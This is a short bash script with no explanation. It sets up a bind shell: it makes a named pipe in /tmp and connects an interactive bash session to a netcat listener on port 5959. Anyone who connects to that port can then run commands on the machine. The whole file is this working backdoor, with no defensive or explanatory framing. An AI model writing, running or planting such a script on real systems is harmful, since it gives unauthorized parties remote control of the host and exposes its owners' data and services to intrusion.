#!/bin/bash

mkfifo /tmp/shell
cat /tmp/shell | /bin/bash -i 2>&1 | nc -kl 5959 > /tmp/shell
